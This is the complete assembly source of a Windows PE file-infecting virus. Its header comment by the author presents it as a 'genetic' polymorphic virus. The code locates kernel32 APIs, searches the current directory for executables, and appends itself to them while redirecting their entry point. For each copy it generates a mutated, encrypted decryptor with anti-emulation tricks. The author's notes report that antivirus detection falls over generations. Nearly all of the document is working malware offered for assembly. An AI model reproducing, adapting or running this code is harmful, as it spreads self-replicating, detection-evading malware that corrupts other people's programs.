; W32.ThanksToDarwin by BlueOwl
; ---------------------------------------------------------------------
;
; W32.ThanksToDarwin is my first genetic polymorphic virus. Unlike normal poly-
; morphic virusses which generate their decryptors at random, this virus
; will use its genes to do so and only a few adaptations are made each
; time to genes. This way, its offspring will look like it and thus
; inherit the genes that made it survive. All thanks to Darwinian -
; evolution :).
;
; Disclaimer: I do mention how fun it is to assemble and try this out
;             a few times in this article. I am not responsible for any
;             loss though. I did my best.
;
; Results with (not yet updated) antivirus scanners in my tests:
; 1st generation detection: 100%
; 2nd generation detection: 70%
; 3rd generation detection: 5%
; 4rd generation detection: 4%
; (no difference after this)
;
; Because of the gene-giving even if only a small fraction survived their
; offspring would infect good because they 'know what worked'.
;
; Details: - Kan produce 268435456 different decryptors and 65536 different
;            encryptions. In all, 17592186044416, different virusses. Leave
;            it up to evolution to find that perfect one!
;          - Infection mark = milliseconds and seconds of the creation date
;            set to zero
;          - Does not restore the original files dates on purpose: file -
;            checkers that see the file has been changed will sooner alert
;            when the program date did not change, as this is typical virus
;            behaviour
;          - Will only infect the current directory so if you like you can
;            try the virus without having to fear getting your whole computer
;            infected
;          - On some points, the virus could do a lot better, I just didn't
;            feel like making it that good. I hope you are inspired to make
;            a genetic virus which is lots better though.
;
; Note: if you choose to assemble it please note that the 1st generation
;       will crash when it tries to return to the original host (because
;       there is none ;)).
;
; Thanks to: Docter Ludwig for his book "The big black book of
;            computer virusses", with some data about genetic
;            virusses in the DOS days.
;
; Assemble with FASM (http://www.flatassembler.net)
;
;
; 17-3-2004 Note: After this version I made lots of other (unpublished,
;           yet?) virusses but I decided to publish this anyways as people
;           might learn something from it anyways. The api finding and
;           everything is very old school, but just remember it was
;           one of my first stupid pe-virusses. I also gave this virus
;           a better RNG.
;
; ---------------------------------------------------------------------

; I'm sorry for not commenting it much

include '%fasminc%/win32ax.inc'

; Simple equates
gzero			  equ db 0ACh,08h,0C0h,75h,0FBh
virus_size		  equ (end_of_virus-start_of_virus)
genes_count		  equ (mgenes_end-mutate)

; Apis
FindFirstFile		  equ [ebp+(_FindFirstFile-delta)]
FindNextFile		  equ [ebp+(_FindNextFile-delta)]
FindClose		  equ [ebp+(_FindClose-delta)]
CreateFile		  equ [ebp+(_CreateFileA-delta)]
ReadFile		  equ [ebp+(_ReadFile-delta)]
WriteFile		  equ [ebp+(_WriteFile-delta)]
CloseHandle		  equ [ebp+(_CloseHandle-delta)]
GlobalAlloc		  equ [ebp+(_GlobalAlloc-delta)]
GlobalLock		  equ [ebp+(_GlobalLock-delta)]
GlobalUnlock		  equ [ebp+(_GlobalUnlock-delta)]
GlobalFree		  equ [ebp+(_GlobalFree-delta)]
SetFileAttributes	  equ [ebp+(_SetFileAttributes-delta)]
FileTimeToLocalFileTime   equ [ebp+(_FileTimeToLocalFileTime-delta)]
FileTimeToSystemTime	  equ [ebp+(_FileTimeToSystemTime-delta)]
SystemTimeToFileTime	  equ [ebp+(_SystemTimeToFileTime-delta)]
LocalFileTimeToFileTime   equ [ebp+(_LocalFileTimeToFileTime-delta)]
SetFileTime		  equ [ebp+(_SetFileTime-delta)]
GetProcAddress		  equ [ebp+(getprocaddr-delta)]

start_of_virus:
virus_start:	mov	edx, 12345678h			  ; this will be filled with the-
		call	delta				  ; decryptor size
delta:		pop	ebp
		mov	eax, ebp
		sub	eax, edx
		sub	eax, (delta-virus_start)
		sub	eax, 12345678h
NEIP:		NewEIP	equ (NEIP-4)
		add	eax, 12345678h
OEIP:		OldEIP	equ (OEIP-4)
		mov	[ebp+(return_addr-delta)], eax

		mov	esi, [esp]
		sub	si, si
		mov	ecx, 20h
loop_mz:	cmp	word [esi], 'MZ'
		je	got_k32
		sub	esi, 1000h
		loopne	loop_mz
		jmp	goto_host
got_k32:	mov	edx,esi
		mov	[ebp+(k32-delta)], edx
		mov	ebx, [esi+03Ch]
		add	ebx, esi
		cmp	word [ebx], 'PE'
		je	kernel_ok
		jmp	goto_host
kernel_ok:	mov	ebx, [ebx+078h]
		add	ebx, esi
		mov	eax, [ebx+020h]
		add	esi, eax
		xor	ecx, ecx
searchexport:	lodsd
		add	eax, edx

		push	esi
		mov	esi, eax
		lodsd
		cmp	eax, 'GetP'
		jne	cagain
		lodsd
		cmp	eax, 'rocA'
		jne	cagain
		pop	esi
		jmp	got_procaddr
cagain: 	pop	esi
		inc	ecx
		cmp	ecx,[ebx+018h]
		jle	searchexport

		jmp	goto_host
got_procaddr: 	mov	esi,[ebx+01Ch]
		add	esi,edx
		inc	ecx
addj:		lodsd
		add	eax,edx
		loop	addj
done:		mov	[ebp+(getprocaddr-delta)],eax

		lea	esi, [ebp+(k32_apis-delta)]
get_apis:	push	esi
		push	[ebp+(k32-delta)]
		call	GetProcAddress
		mov	ebx, eax
		gzero
		mov	edi, esi
		mov	eax, ebx
		stosd
		mov	esi, edi
		mov	al, [esi]
		or	al, al
		jnz	get_apis

		pushad
		lea	edi, [ebp+(cpy-delta)]
		lea	esi, [ebp+(mutate-delta)]
		mov	ecx, (mutateend-mutate)
		rep	movsb
		popad

		push	314d
		push	GMEM_MOVEABLE
		call	GlobalAlloc
		or	eax, eax
		jz	goto_host
		mov	[ebp+(findmem_handle-delta)], eax
		push	eax
		call	GlobalLock
		mov	[ebp+(findmem-delta)], eax

		push	eax
		lea	eax, [ebp+(search_mask-delta)]
		push	eax
		call	FindFirstFile
		mov	[ebp+(find_handle-delta)], eax
		inc	eax
		jz	search_end

infect_file:	mov	eax, [ebp+(findmem-delta)]
		lea	eax, [eax+4]

		lea	ebx, [ebp+(filetime-delta)]
		push	ebx
		push	eax
		call	FileTimeToLocalFileTime

		lea	eax, [ebp+(systemtime-delta)]
		push	eax
		lea	ebx, [ebp+(filetime-delta)]
		push	ebx
		call	FileTimeToSystemTime

		mov	ax, [ebp+(smsecond-delta)]
		cmp	ax, 0
		jne	host_ok
		mov	ax, [ebp+(ssecond-delta)]
		cmp	ax, 0
		je	already_infected

host_ok:	mov	[ebp+(smsecond-delta)], 0
		mov	[ebp+(ssecond-delta)], 0

		call	infection

already_infected:

		push	[ebp+(findmem-delta)]
		push	[ebp+(find_handle-delta)]
		call	FindNextFile
		or	eax, eax
		jnz	infect_file

		push	[ebp+(find_handle-delta)]
		call	FindClose

search_end:	push	[ebp+(findmem_handle-delta)]
		call	GlobalUnlock
		push	[ebp+(findmem_handle-delta)]
		call	GlobalFree

		or	ebp, ebp
		jz	skip_jump

goto_host:	push	[ebp+(return_addr-delta)]
skip_jump:	ret

; -----------------------------------------------------------------------------------

infection:	push	0
		push	FILE_ATTRIBUTE_NORMAL
		push	OPEN_EXISTING
		push	0
		push	FILE_SHARE_READ
		push	GENERIC_READ
		mov	ebx, [ebp+(findmem-delta)]
		add	ebx, 44
		push	ebx
		call	CreateFile
		mov	[ebp+(file_handle-delta)], eax
		mov	edx, eax
		inc	eax
		jz	return_infect			; can't open

		mov	eax, [ebp+(findmem-delta)]
		mov	eax, [eax+32]
		add	eax, (virus_size+600)		; make some room (+600 to be sure)
		push	eax
		push	GMEM_MOVEABLE
		call	GlobalAlloc
		or	eax, eax
		jz	close_file			; can't allocate
		mov	[ebp+(filemem_handle-delta)], eax

		push	eax
		call	GlobalLock
		mov	[ebp+(filemem-delta)], eax

		push	0
		lea	ebx, [ebp+(NBR-delta)]
		push	ebx
		mov	eax, [ebp+(findmem-delta)]
		push	dword [eax+32]
		push	[ebp+(filemem-delta)]
		push	[ebp+(file_handle-delta)]
		call	ReadFile
		or	eax, eax
		jz	close_mem

		push	[ebp+(file_handle-delta)]
		call	CloseHandle

		mov	eax, [ebp+(filemem-delta)]
		mov	esi, [eax+3Ch]
		add	esi, eax			; get pointer to pe header

		cmp	dword [esi], "PE"
		jne	close_mem

		mov	eax, [esi+3Ch]
		mov	[ebp+(file_align-delta)], eax
		mov	edi, esi

		movzx	eax, word [edi+06h]
		dec	eax
		imul	eax,eax,28h			; * 28
		add	esi,eax 			;
		add	esi,78h 			; dir table
		mov	edx,[edi+74h]			; dir entries
		shl	edx,3				; * 8
		add	esi,edx 			; last section

		mov	eax,[edi+28h]			; get entrypoint
		mov	dword [ebp+(OldEIP-delta)],eax	; save

		mov	edx,[esi+10h]			; edx = size of raw data
		mov	ebx,edx 			;
		add	edx,[esi+14h]			; add pointer to raw data

		push	edx

		mov	eax,ebx
		add	eax,[esi+0Ch]			; eax = new eip
		mov	[edi+28h],eax			; change it
		mov	dword [ebp+(NewEIP-delta)],eax

		mov	[ebp+(sheader-delta)], esi
		mov	[ebp+(dheader-delta)], edi
		pop	edx

		or	dword [esi+24h],0A0000020h  ; put writeable, readable, executable

		xchg	edi,edx

		add	edi,dword [ebp+(filemem-delta)]    ; save the stuff for later
		mov	[ebp+(start_host-delta)], edi

		pushad
		lea	esi, [ebp+(cpy-delta)]
		lea	edi, [ebp+(mutate-delta)]
		mov	ecx, (mutateend-mutate)
		rep	movsb				   ; save the genes
		dw	310Fh
		xor	[ebp+(random_seed-delta)], eax	   ; randomize
		xor	[ebp+(startkey-delta)], al	   ; ..
		xor	[ebp+(slidingkey-delta)], ah	   ; ..

		lea	esi, [ebp+(mutate-delta)]
		mov	edi, esi
		mov	ecx, genes_count
decide_loop:	sub	eax, eax			   ; randomize the genes
		mov	al, genes_count
		call	rand_index
		or	eax, eax
		jnz	noswitch
		lodsb
		xor	al, 1				   ; switch gene off/on
		stosb
		jmp	switched
noswitch:	movsb
switched:	dec	ecx
		jne	decide_loop
		mov	ecx, 6
		lea	esi, [ebp+(regs-delta)]
decide2_loop:	mov	eax, 5
		call	rand_index
		mov	ebx, eax
		mov	al, [esi]
		xchg	al, [esi+ebx]
		mov	[esi], al
		dec	ecx
		jne	decide2_loop
		popad

	; ---------------------------------------------------------------------------

original_esp	equ [edx-(1*4)]
so_virus	equ [edx-(2*4)]
so_void 	equ [edx-(3*4)]
vsize		equ [edx-(4*4)]
pos_callplace	equ [edx-(5*4)]
ads_distance	equ [edx-(6*4)]
ads_size	equ [edx-(7*4)]
start_loop	equ [edx-(8*4)]

poly_generator: mov	edx, esp			  ; stack to edx
		push	esp
		push	esi
		push	edi
		push	ecx

	; Gene for cutting of emulation
	; -----------------------------

		cmp	[ebp+(gene_noemul-delta)], 0
		je	no_emul
		mov	ax, 0C029h
		stosw
		mov	ax, 0C8FEh			 ; sub eax, eax
		stosw					 ; keep_going: dec al
		mov	ax, 0C008h			 ; or al, al
		stosw					 ; je was_oke
		mov	ax, 0474h			 ; jne keep_going
		stosw					 ; jmp somewhere_in_code
		mov	ax, 0F875h			 ; was_oke:
		stosw
		mov	ax, 67EBh
		stosw

no_emul:

	; Extra anti emulation
	; --------------------

		cmp	[ebp+(gene_specialkey-delta)], 0
		jne	skipskey
		cmp	[ebp+(startkey-delta)], 0
		je	skipskey			      ; here an av would get
		mov	ax, 1829h			      ; forced to loop X times
		or	ah, [ebp+(gene_encrypt-delta)]	      ; in order to get the
		shl	ah, 3				      ; encryption key
		or	ah, [ebp+(gene_encrypt-delta)]	      ; if it doesn't (and most-
		stosw					      ; don't) the virus body
		mov	ax, 0C929h			      ; will be wrongly de-
		stosw					      ; crypted
		mov	al, 0B1h
		stosb
		mov	al, [ebp+(startkey-delta)]
		stosb
		mov	al, 40h
		or	al, [ebp+(gene_encrypt-delta)]
		stosb
		mov	ax, 0FDE2h
		cmp	[ebp+(gene_specialkeyl-delta)],0
		jne	no_decskl
		mov	al, 049h
		stosb
		mov	ax, 0FC75h
no_decskl:	stosw
skipskey:

	; Gene for the Call
	; -----------------

		cmp	[ebp+(gene_call-delta)], 0
		jne	callway2
		mov	al, 0E8h			; call nextbyte
		stosb
		push	edi
		sub	eax, eax			;  " "
		stosd
		mov	al, 58h
		or	al, [ebp+(gene_memreg-delta)]
		stosb
		jmp	callend
callway2:	mov	al, 0E8h			; call to_end_of_code
		stosb
		push	edi
		stosd
callend:

	; Gene for adding distance
	; ------------------------

		mov	al, 81h 		      ; this is always in front of
						      ; add and sub

		cmp	[ebp+(gene_distance-delta)],0
		jne	distance2
		mov	ah, 0C0h		      ; add
		jmp	distancedone
distance2:	mov	ah, 0E8h		      ; sub
distancedone:	or	ah, [ebp+(gene_memreg-delta)]
		stosw
		push	edi
		stosd


	; Gene for declaring virus-size
	; -----------------------------

		cmp	[ebp+(gene_size-delta)],0
		jne	size2
		mov	al, 0B8h		    ; mov reg, x
		or	al, [ebp+(gene_counter-delta)]
		stosb
		jmp	size_done
size2:		cmp	[ebp+(gene_sizem-delta)], 0
		jne	sizem2
		mov	ax, 01831h		    ; xor reg, reg
		or	ah, [ebp+(gene_counter-delta)]
		shl	ah, 3
		or	ah, [ebp+(gene_counter-delta)]
		stosw
		jmp	sizeput
sizem2: 	mov	ax, 01829h
		or	ah, [ebp+(gene_counter-delta)]
		shl	ah, 3
		or	ah, [ebp+(gene_counter-delta)]
		stosw
sizeput:	cmp	[ebp+(gene_sizea-delta)], 0
		je	puts2
		mov	ax, 0F081h
		jmp	putsand
puts2:		mov	ax, 0C881h
putsand:	or	ah, [ebp+(gene_counter-delta)]
		stosw
size_done:	push	edi
		mov	eax, virus_size
		stosd


	; Gene for declaring the first
	; encryption value
	; ----------------------------

		cmp	[ebp+(gene_specialkey-delta)], 0
		je	key_done
key_normal:	cmp	[ebp+(gene_1stval-delta)],0
		jne	firstval2
		mov	al, 0B8h
		or	al, [ebp+(gene_encrypt-delta)]
		stosb
		jmp	firstvalend
firstval2:	cmp	[ebp+(gene_1stvalb-delta)], 0
		jne	firstvalb2
		mov	ax, 0E083h
		or	ah, [ebp+(gene_encrypt-delta)]
		stosw
		sub	eax, eax
		stosb
		jmp	firstvalb_end
firstvalb2:	mov	ax, 01829h
		or	ah, [ebp+(gene_encrypt-delta)]
		shl	ah, 3
		or	ah, [ebp+(gene_encrypt-delta)]
		stosw
firstvalb_end:	cmp	[ebp+(gene_addenc-delta)], 0
		jne	fza2
		mov	ax, 0C081h
		or	ah, [ebp+(gene_encrypt-delta)]
		stosw
		jmp	firstvalend
fza2:		mov	ax, 0C881h
		or	ah, [ebp+(gene_encrypt-delta)]
		stosw
firstvalend:	push	edi
		sub	eax, eax
		mov	al, [ebp+(startkey-delta)]
		stosd
key_done:


		push	edi

	; Get byte gene
	; -------------

		cmp	[ebp+(gene_getbyte-delta)], 0
		jne	getbyte2
		mov	al, 08Ah			    ; xchg or mov
		jmp	getbytedone
getbyte2:	mov	al, 086h
getbytedone:	mov	ah, [ebp+(gene_memreg-delta)]
		stosw

	; Encrypt byte gene
	; -----------------

		cmp	[ebp+(gene_encryptb-delta)], 0
		jne	eb2
		mov	ax, 2966h		    ; sub
		jmp	insbe
eb2:		mov	ax, 3166h		    ; xor
insbe:		stosw
		mov	al, 18h
		or	al, [ebp+(gene_encrypt-delta)]
		shl	al, 3
		stosb

	; Store byte gene
	; ---------------

		mov	al, 88h
		cmp	[ebp+(gene_store-delta)], 0    ; xchg or mov again
		jne	store2
		mov	al, 86h
store2: 	mov	ah, [ebp+(gene_memreg-delta)]
		stosw

	; Increment memreg gene
	; ---------------------

		cmp	[ebp+(gene_increment-delta)], 0
		jne	inc2
		mov	al, 040h		       ; inc
		or	al, [ebp+(gene_memreg-delta)]
		stosb
		jmp	incdone
inc2:		mov	ax, 0C083h		       ; add
		or	ah, [ebp+(gene_memreg-delta)]
		stosw
		mov	al, 1
		stosb
incdone:

	; Change the encryption key gene
	; ------------------------------

		cmp	[ebp+(gene_slidingkey-delta)], 0
		jne	no_slidingkey
		cmp	[ebp+(gene_slidingkeym-delta)], 0
		jne	slidingkey2
		mov	al, 80h
		stosb
		mov	al, 0C0h
		or	al, [ebp+(gene_encrypt-delta)]
		mov	ah, [ebp+(slidingkey-delta)]
		stosw
		jmp	slidingkey_done
slidingkey2:	mov	al, 40h
		or	al, [ebp+(gene_encrypt-delta)]
		stosb
slidingkey_done:
no_slidingkey:

	; Decrement the encryptcount gene
	; -------------------------------

		cmp	[ebp+(gene_ecount-delta)], 0
		jne	ecount2
		mov	ax, 0E883h
		or	ah, [ebp+(gene_counter-delta)]
		stosw
		mov	al, 1
		jmp	ecount_done
ecount2:	mov	al, 48h
		or	al, [ebp+(gene_counter-delta)]
ecount_done:	stosb

	; Loop gene
	; ---------

		cmp	[ebp+(gene_loop-delta)], 0
		jne	loop2
		mov	ax, 0F883h
		or	ah, [ebp+(gene_counter-delta)]
		stosw
		sub	eax, eax
		stosb
		mov	ebx, edi
		sub	ebx, start_loop
		neg	bl
		dec	bl
		dec	bl
		mov	al, 75h
		cmp	[ebp+(gene_loop2-delta)], 0
		jne	loop1b
		mov	al, 77h
loop1b: 	mov	ah, bl
		stosw
		jmp	loopdone
loop2:		mov	ax, 1809h
		or	ah, [ebp+(gene_counter-delta)]
		shl	ah, 3
		or	ah, [ebp+(gene_counter-delta)]
		stosw
		mov	ebx, edi
		sub	ebx, start_loop
		neg	bl
		dec	bl
		dec	bl
		mov	al, 75h
		mov	ah, bl
		stosw

loopdone:

	; Catch call gene
	; ---------------

		cmp	[ebp+(gene_call-delta)], 0
		je	skip_catchcall
		mov	al, 0EBh
		stosb			      ; ...
		mov	esi, edi
		stosb

		mov	eax, edi
		mov	ebx, pos_callplace
		sub	eax, ebx
		sub	eax, 4
		mov	[ebx], eax
		mov	al, 58h
		or	al, [ebp+(gene_memreg-delta)]
		stosb
		cmp	[ebp+(gene_callret-delta)], 0
		je	callret2
		mov	al, 50h
		or	al, [ebp+(gene_memreg-delta)]
		mov	ah, 0C3h
		stosw
		jmp	endcallret
callret2:	mov	ax, 0E0FFh
		or	ah, [ebp+(gene_memreg-delta)]
		stosw

endcallret:	mov	eax, edi
		sub	eax, esi
		dec	eax
		mov	[esi], al

skip_catchcall:

; ....................................................................................

ender:		mov	ecx, ads_distance
		mov	eax, edi
		sub	eax, pos_callplace
		sub	eax, 4
		cmp	[ebp+(gene_distance-delta)], 0
		je	skip_neg
		neg	eax
skip_neg:	mov	[ecx], eax

		push	edi
		lea	esi,[ebp+(virus_start-delta)]	; copy virus (with changed DNA)
		mov	ecx,virus_size			; to host
		rep	movsb				;
		pop	esi
		mov	eax, esi
		sub	eax, [ebp+(start_host-delta)]
		mov	[esi+1], eax

		sub	ebx, ebx
		cmp	[ebp+(gene_slidingkey-delta)], 0
		jne	skip_sliding
		cmp	[ebp+(gene_slidingkeym-delta)], 0
		jne	s_onlyinc
		mov	bl, [ebp+(slidingkey-delta)]
		dec	bl
s_onlyinc:	inc	bl
skip_sliding:
		mov	bh, [ebp+(startkey-delta)]

		push	edi
		mov	edi, esi
		mov	ecx, virus_size
		cmp	[ebp+(gene_encryptb-delta)], 0
		jne	loop_encryptx
loop_encrypta:	lodsb
		add	al, bh
		stosb
		add	bh, bl
		loop	loop_encrypta
		jmp	endx
loop_encryptx:	lodsb
		xor	al, bh
		stosb
		add	bh, bl
		loop	loop_encryptx
endx:

		pop	edi
		mov	esp, original_esp


	; ---------------------------------------------------------------------------

		sub	edi, [ebp+(start_host-delta)]
		mov	[ebp+(start_host-delta)], edi

		push	FILE_ATTRIBUTE_NORMAL
		mov	eax, [ebp+(findmem-delta)]
		lea	eax, [eax+44]
		push	eax
		call	SetFileAttributes

		push	0
		push	FILE_ATTRIBUTE_NORMAL
		push	CREATE_ALWAYS
		push	0
		push	0
		push	GENERIC_WRITE
		mov	eax, [ebp+(findmem-delta)]
		lea	eax, [eax+44]
		push	eax
		call	CreateFile
		mov	[ebp+(file_handle-delta)], eax
		inc	eax
		jz	close_mem

		push	0
		lea	eax, [ebp+(NBR-delta)]
		push	eax
		mov	eax, [ebp+(findmem-delta)]
		mov	eax, [eax+32]
		add	eax, [ebp+(start_host-delta)]
		mov	ecx, [ebp+(file_align-delta)]
		call	align_it
		push	eax
		mov	esi,[ebp+(sheader-delta)]
		mov	edi,[ebp+(dheader-delta)]

		mov	eax,[esi+10h]			; SizeOfRawData
		add	eax,[ebp+(start_host-delta)]	; +virus_size+decryptor_size
		mov	ecx,[edi+3Ch]
		call	align_it

		mov	[esi+10h], eax			 ; save the new sizes
		mov	[esi+08h], eax

		;mov     eax,[esi+10h]                   ; EAX = New SizeOfRawData
		add	eax,[esi+0Ch]
		mov	[edi+50h],eax			; save to size of image

		push	[ebp+(filemem-delta)]
		push	[ebp+(file_handle-delta)]
		call	WriteFile

		lea	eax, [ebp+(filetime-delta)]	 ; normal time to local filetime
		push	eax
		lea	eax, [ebp+(systemtime-delta)]
		push	eax
		call	SystemTimeToFileTime

		lea	eax, [ebp+(filetime2-delta)]	 ; local filetime to filetime
		push	eax
		lea	eax, [ebp+(filetime-delta)]
		push	eax
		call	LocalFileTimeToFileTime

		push	0				; mark the file as infected
		push	0
		lea	eax, [ebp+(filetime2-delta)]
		push	eax
		push	[ebp+(file_handle-delta)]
		call	SetFileTime

close_mem:	push	[ebp+(filemem_handle-delta)]
		call	GlobalUnlock
		push	[ebp+(filemem_handle-delta)]
		call	GlobalFree
close_file:	push	[ebp+(file_handle-delta)]      ; set original attributes
		call	CloseHandle
		mov	eax, [ebp+(findmem-delta)]
		push	dword [eax]
		lea	eax, [eax+44]
		push	eax
		call	SetFileAttributes

return_infect:	ret


       ; simple align a value
       ; --------------------

align_it:	push	edx
		sub	edx, edx
		push	eax
		div	ecx
		pop	eax
		sub	ecx, edx
		add	eax, ecx
		pop	edx
		ret

       ; random number between 0 and eax
       ; (this is a good one!)
       ; -------------------------------

rand_index:	push	edx
		push	ecx
		push	ebx
		mov	ecx, eax
		inc	ecx
		mov	eax, [ebp+(random_seed-delta)]
		rol  	eax, 5		; by me ;)
		neg  	ax
		mov  	bx, ax
		sub  	al, ah
		bswap 	eax
		xor  	ah, al
		sub  	ax, bx
		mov	[ebp+(random_seed-delta)], eax
		sub	edx, edx
		div	ecx
		mov	eax, edx
		pop	ebx
		pop	ecx
		pop	edx
		ret

; -----------------------------------------------------------------------------------
; DATA

file_handle	dd 0
filemem_handle	dd 0		; handles
filemem 	dd 0
file_align	dd 0
return_addr	dd 0
start_host	dd 0

search_mask	db "test*.exe",0
find_handle	dd 0
findmem_handle	dd 0
findmem 	dd 0

startkey	db 11h
slidingkey	db 9Ch



; The virus DNA
; Feel free to make changes and see
; the decryptor change :)
; ---------------------------------

	mutate:
		gene_call	 db 0 ; should have been just bits, but whatever ;)
		gene_distance	 db 0
		gene_size	 db 0
		gene_sizem	 db 0
		gene_sizea	 db 0
		gene_1stval	 db 0
		gene_1stvalb	 db 0
		gene_addenc	 db 0
		gene_getbyte	 db 0
		gene_encryptb	 db 0
		gene_store	 db 0
		gene_increment	 db 0
		gene_ecount	 db 0
		gene_loop	 db 0
		gene_loop2	 db 0
		gene_noemul	 db 0
		gene_callret	 db 0
		gene_slidingkey  db 0
		gene_slidingkeym db 0
		gene_specialkey  db 0
		gene_specialkeyl db 0
	mgenes_end:

	regs:
		gene_memreg	 db 6h ; I think i forgot to make code for changing
		gene_counter	 db 1h ; these :D. Whatever ;)
		gene_encrypt	 db 3h
		gene_encryptc	 db 2h
		gene_junk1	 db 5h
		gene_junk2	 db 7h
	mutateend:

cpy		rb (mutateend-mutate)

filetime	dd 0,0
filetime2	dd 0,0
systemtime	dw 0,0,0,0,0,0
ssecond 	dw 0
smsecond	dw 0
random_seed	dd 93FA017Bh
NBR		dd 0
k32		dd 0
getprocaddr	dd 0
sheader 	dd 0
dheader 	dd 0

gptext		db 'GetProcAddress',0


; Api table
k32_apis		 db "FindFirstFileA",0
_FindFirstFile		 dd 0
			 db "FindNextFileA",0
_FindNextFile		 dd 0
			 db "FindClose",0
_FindClose		 dd 0
			 db "CreateFileA",0
_CreateFileA		 dd 0
			 db "ReadFile",0
_ReadFile		 dd 0
			 db "WriteFile",0
_WriteFile		 dd 0
			 db "CloseHandle",0
_CloseHandle		 dd 0
			 db "GlobalAlloc",0
_GlobalAlloc		 dd 0
			 db "GlobalLock",0
_GlobalLock		 dd 0
			 db "GlobalUnlock",0
_GlobalUnlock		 dd 0
			 db "GlobalFree",0
_GlobalFree		 dd 0
			 db "SetFileAttributesA",0
_SetFileAttributes	 dd 0
			 db "FileTimeToLocalFileTime",0     ; apis used for
_FileTimeToLocalFileTime dd 0				    ; filemarking
			 db "FileTimeToSystemTime",0
_FileTimeToSystemTime	 dd 0
			 db "SystemTimeToFileTime",0
_SystemTimeToFileTime	 dd 0
			 db "LocalFileTimeToFileTime",0
_LocalFileTimeToFileTime dd 0
			 db "SetFileTime",0
_SetFileTime		 dd 0

			 db 0
end_of_virus:


; &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&








